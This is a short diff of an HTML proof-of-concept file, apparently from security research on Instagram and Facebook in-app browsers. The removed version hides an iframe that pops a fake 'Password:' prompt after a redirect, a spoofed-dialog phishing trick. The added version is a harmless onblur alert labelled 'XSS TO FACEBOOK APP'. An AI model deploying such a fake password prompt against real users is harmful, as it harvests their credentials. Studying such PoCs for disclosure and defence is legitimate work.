@@ -1,18 +1,20 @@
-<!DOCTYPE html>
 <html>
-<head>
-    <title>PoC</title>
-    <script>
-    function triggerIframe() {
-        var iframe = document.createElement('iframe');
-        document.location="http://www.instagram.com";
-        iframe.src = 'javascript:prompt("Password:")';
-        iframe.style.display = 'none';
-        document.body.appendChild(iframe);
-    }
-    </script>
-</head>
+
 <body>
-    <button onclick="triggerIframe()">Trigger</button>
+
+<script>
+
+window.onblur=function incognito() {
+
+
+alert('XSS TO FACEBOOK APP');
+
+
+}
+
+</script>
+
+<h4> CLICK HERE </h4>
+
 </body>
 </html>
